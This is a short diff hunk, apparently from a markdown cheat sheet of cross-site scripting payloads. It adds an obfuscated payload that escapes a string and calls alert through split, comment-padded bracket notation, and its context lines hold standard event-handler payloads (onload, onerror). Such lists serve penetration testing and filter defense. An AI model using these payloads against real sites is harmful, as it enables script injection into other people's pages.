@@ -14,6 +14,7 @@ onload=alert(1)><svg> # newline char
 ```
 *Standard HTML events*
 ```javascript
+';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
 <body onload=alert()>
 <img src=x onerror=alert()>
 <svg onload=alert()>
